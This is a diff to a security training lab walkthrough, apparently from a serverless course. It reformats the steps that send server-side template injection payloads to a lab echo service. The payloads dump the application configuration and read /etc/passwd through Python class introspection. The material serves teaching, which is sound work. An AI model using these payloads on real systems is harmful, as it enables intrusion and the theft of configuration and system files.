@@ -38,7 +38,11 @@
 
 ##### Step 3:
 
-* Run  `http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"` to get the system configuration.
+* Run the below command to get the system configuration.
+
+```commandline
+http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"
+```
 
     ```commandline
     root@we45-VirtualBox:/home/we45/container_training/Serverless/Function-Data-Injection/Server-Side-Template-Injection# http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"
@@ -69,7 +73,12 @@
     
 ##### Step 4:
 
-* Run `http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"` to get the etc/password file info.
+* Run the below  command to get the etc/password file info.
+
+```commandline
+http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"
+```
+
 
     ```commandline
     root@we45-VirtualBox:/home/we45/container_training/Serverless/Function-Data-Injection/Server-Side-Template-Injection# http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"
@@ -249,6 +258,3 @@
                 </body>
                 </html>
     ```
-
-
-
